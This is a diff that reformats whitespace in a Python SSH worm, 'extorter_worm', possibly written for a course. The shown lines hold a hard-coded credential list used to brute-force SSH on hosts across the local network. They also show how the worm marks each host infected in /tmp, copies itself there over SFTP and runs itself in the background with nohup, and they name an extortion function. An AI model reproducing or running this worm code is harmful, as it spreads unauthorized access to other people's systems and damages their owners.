@@ -22,17 +22,14 @@ import shutil
 
 from subprocess import call
 
-
-
 # The list of credentials to attempt
 credList = [
-('hello', 'world'),
-('hello1', 'world'),
-('root', '#Gig#'),
-('cpsc', 'cpsc'),
-('ubuntu', '123456')
+    ('hello', 'world'),
+    ('hello1', 'world'),
+    ('root', '#Gig#'),
+    ('cpsc', 'cpsc'),
+    ('ubuntu', '123456')
 ]
-
 
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
@@ -78,7 +75,6 @@ def isInfectedSystem(ssh):
 # Marks the system as infected
 #################################################################
 def markInfectedAndSpread(sftpClient):
-
     # Mark the system as infected. One way to do
     # this is to create a file called infected.txt
     # in directory /tmp/
@@ -88,14 +84,12 @@ def markInfectedAndSpread(sftpClient):
     sftpClient.put(INFECTED_MARKER_FILE, INFECTED_MARKER_FILE)
 
 
-
 ###############################################################
 # Spread to the other system and execute
 # @param sshClient - the instance of the SSH client connected
 # to the victim system
 ###############################################################
 def executeWorm(sshClient):
-
     # This function takes as a parameter
     # an instance of the SSH class which
     # was properly initialized and connected
@@ -110,7 +104,6 @@ def executeWorm(sshClient):
     sshClient.exec_command("nohup python /tmp/extorter_worm.py &")
 
 
-
 ############################################################
 # Try to connect to the given host given the existing
 # credentials
@@ -122,7 +115,6 @@ def executeWorm(sshClient):
 # 3 = probably the server is down or is not running SSH
 ###########################################################
 def tryCredentials(host, username, password, sshClient):
-
     # Tries to connect to host host using
     # the username stored in variable userName
     # and password stored in variable password
@@ -167,7 +159,6 @@ def tryCredentials(host, username, password, sshClient):
 # If the attack failed, returns a NULL
 ###############################################################
 def dictAttack(host):
-
     # The credential list
     global credList
 
@@ -196,6 +187,7 @@ def dictAttack(host):
     # Could not find working credentials
     return None
 
+
 ####################################################
 # Returns the IP of the current system
 # @param interface - the interface whose IP we would
@@ -217,6 +209,7 @@ def getMyIP():
             break
 
     return ipAddr
+
 
 #######################################################
 # Returns the list of systems on the same network
@@ -280,7 +273,6 @@ def extortSystem(currentIP):
         print "Initial execution, not infecting home server."
 
 
-
 ################################################################
 # Main
 # @param - None
@@ -305,12 +297,11 @@ def main():
     print "Found hosts: ", networkHosts
     print
 
-
     # Go through the network hosts
     for host in networkHosts:
 
         # Try to attack this host
-        sshInfo =  dictAttack(host)
+        sshInfo = dictAttack(host)
         print
 
         # Did the attack succeed?
